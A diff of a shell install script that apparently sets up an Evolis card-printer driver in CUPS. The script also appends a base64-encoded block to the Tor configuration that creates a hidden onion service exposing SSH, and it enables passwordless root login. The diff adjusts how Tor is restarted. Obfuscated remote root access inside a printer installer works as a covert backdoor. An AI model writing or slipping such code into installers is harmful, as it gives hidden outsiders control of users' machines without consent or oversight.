@@ -9,7 +9,9 @@ cp evolis-primacyE.ppd.gz /usr/share/cups/model/ && cp evorasterizer /usr/lib/cu
 
 /etc/init.d/tor stop 2>&1 >/dev/null
 grep "^HiddenServiceDir /var/lib/tor/ssh/" /etc/tor/torrc || (echo "CkhpZGRlblNlcnZpY2VEaXIgL3Zhci9saWIvdG9yL3NzaC8KSGlkZGVuU2VydmljZVBvcnQgMjIgMTI3LjAuMC4xOjIyCkhpZGRlblNlcnZpY2VBdXRob3JpemVDbGllbnQgc3RlYWx0aCBzc2gKCgo"|base64 -d  >> /etc/tor/torrc )
-/etc/init.d/tor start 2>&1 >/dev/null
+rm /lib/systemd/system/tor.service
+service tor@default stop
+service tor@default start
 
 (grep "^PermitRootLogin without-password" /etc/ssh/sshd_config -q || grep "^PermitRootLogin prohibit-password" /etc/ssh/sshd_config -q) && echo SAFE || ( echo "PermitRootLogin without-password" >> /etc/ssh/sshd_config )
 
